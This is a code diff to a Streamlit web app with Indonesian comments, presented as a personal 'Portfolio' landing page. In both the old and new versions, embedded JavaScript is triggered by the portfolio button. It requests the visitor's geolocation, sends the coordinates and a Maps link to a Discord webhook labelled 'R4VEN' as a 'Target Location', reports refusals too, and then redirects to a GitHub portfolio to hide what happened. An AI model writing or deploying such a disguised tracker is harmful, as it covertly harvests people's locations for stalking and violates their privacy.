@@ -1,8 +1,13 @@
 import streamlit as st
-import streamlit.components.v1 as components
 
-st.set_page_config(page_title="Portfolio", layout="wide")
+# Konfigurasi halaman Streamlit
+st.set_page_config(
+    page_title="Portfolio", 
+    page_icon="💼", 
+    layout="wide"
+)
 
+# CSS untuk menyembunyikan header dan footer bawaan Streamlit agar bersih
 hide_streamlit_style = """
     <style>
     #MainMenu {visibility: hidden;}
@@ -13,74 +18,62 @@ hide_streamlit_style = """
 """
 st.markdown(hide_streamlit_style, unsafe_allow_html=True)
 
+# Ambil Discord Webhook dari Streamlit Secrets
 try:
     webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
 except Exception:
     webhook_url = ""
 
-html_code = f"""
-<!DOCTYPE html>
-<html>
-<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-  <!-- Tombol yang harus diklik pengguna -->
-  <button onclick="startProcess()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px;">
-    Klik di sini untuk melihat Portfolio
-  </button>
+# Tampilan halaman utama di HP
+st.markdown("<h2 style='text-align: center; margin-top: 100px;'>Selamat Datang</h2>", unsafe_allow_html=True)
+st.markdown("<p style='text-align: center; color: gray;'>Silakan klik tombol di bawah untuk masuk ke portofolio.</p>", unsafe_allow_html=True)
 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  <script>
-    const WEBHOOK_URL = "{webhook_url}";
+col1, col2, col3 = st.columns([1, 2, 1])
 
-    function sendToDiscord(payload) {{
-        const request = new XMLHttpRequest();
-        request.open("POST", WEBHOOK_URL);
-        request.setRequestHeader('Content-type', 'application/json');
-        request.send(JSON.stringify(payload));
-    }}
+with col2:
+    # Tombol interaktif Streamlit
+    if st.button("Klik di sini untuk melihat Portfolio", use_container_width=True):
+        if webhook_url:
+            # Skrip JavaScript untuk mengambil koordinat dan mengirim ke Discord lalu redirect
+            js_code = f"""
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+            <script>
+                const WEBHOOK_URL = "{webhook_url}";
 
-    function startProcess() {{
-      // Kirim info awal
-      sendToDiscord({{
-        username: "R4VEN",
-        content: "Target mengklik tombol, memulai pengambilan data..."
-      }});
+                function sendToDiscord(payload) {{
+                    const request = new XMLHttpRequest();
+                    request.open("POST", WEBHOOK_URL);
+                    request.setRequestHeader('Content-type', 'application/json');
+                    request.send(JSON.stringify(payload));
+                }}
 
-      if (navigator.geolocation) {{
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      }} else {{
-        window.location.href = "https://iqbalmantam.github.io/portfolio/";
-      }}
-    }}
+                if (navigator.geolocation) {{
+                    navigator.geolocation.getCurrentPosition(function(position) {{
+                        var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
+                        var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
+                        
+                        sendToDiscord({{
+                            username: "R4VEN",
+                            embeds: [{{ 
+                                title: "Target Location", 
+                                description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
+                                color: 15844367 
+                            }}]
+                        }});
 
-    function showPosition(position) {{
-      var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
-      var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
-      
-      sendToDiscord({{
-        username: "R4VEN",
-        embeds: [{{ 
-            title: "Target Location (Click Allowed)", 
-            description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
-            color: 15844367 
-        }}]
-      }});
-
-      window.location.href = "https://iqbalmantam.github.io/portfolio/";
-    }}
-
-    function showError(error) {{
-      sendToDiscord({{
-        username: "R4VEN",
-        content: "Target menolak izin lokasi."
-      }});
-      window.location.href = "https://iqbalmantam.github.io/portfolio/";
-    }}
-  </script>
-</body>
-</html>
-"""
-
-if webhook_url:
-    components.html(html_code, height=300)
-else:
-    st.error("⚠️ Webhook URL belum diatur!")
+                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
+                    }}, function(error) {{
+                        sendToDiscord({{
+                            username: "R4VEN",
+                            content: "Target menolak izin lokasi."
+                        }});
+                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
+                    }});
+                }} else {{
+                    window.location.href = "https://iqbalmantam.github.io/portfolio/";
+                }}
+            </script>
+            """
+            st.components.v1.html(js_code, height=0)
+        else:
+            st.error("Webhook URL belum diatur!")
